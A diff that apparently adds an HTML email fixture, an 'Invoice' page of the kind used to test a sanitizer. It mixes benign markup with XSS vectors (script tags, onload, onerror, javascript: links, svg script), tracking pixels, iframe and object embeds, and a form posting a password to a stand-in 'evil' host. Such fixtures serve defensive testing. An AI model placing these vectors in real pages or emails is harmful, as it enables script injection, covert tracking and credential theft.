@@ -1,0 +1,14 @@
+<html><head><title>Invoice</title><style>body{background:url(https://tracker.example.test/s.gif)}</style>
+<script>alert('head')</script></head>
+<body onload="alert('load')">
+<p style="color: #b91c1c; font-weight: bold; position: fixed; background-image: url(https://tracker.example.test/bg.gif)">Payment overdue</p>
+<p><a href="javascript:alert('link')">Pay now</a> or <a href="https://pay.example.test/invoice/7" target="_blank">pay here</a> or <a href="mailto:billing@example.test">write to us</a>.</p>
+<img src="https://tracker.example.test/open.gif" width="1" height="1">
+<img src="cid:logo@example.test" alt="Logo" onerror="alert('img')">
+<table border="1" cellpadding="4"><tr><th>Item</th><th>Amount</th></tr><tr><td>Bracket</td><td style="text-align: right">12.00</td></tr></table>
+<iframe src="https://evil.example.test/"></iframe>
+<form action="https://evil.example.test/steal"><input name="password"></form>
+<object data="https://evil.example.test/x.swf"></object><embed src="https://evil.example.test/x.swf">
+<svg><script>alert('svg')</script></svg>
+<!-- a comment -->
+</body></html>
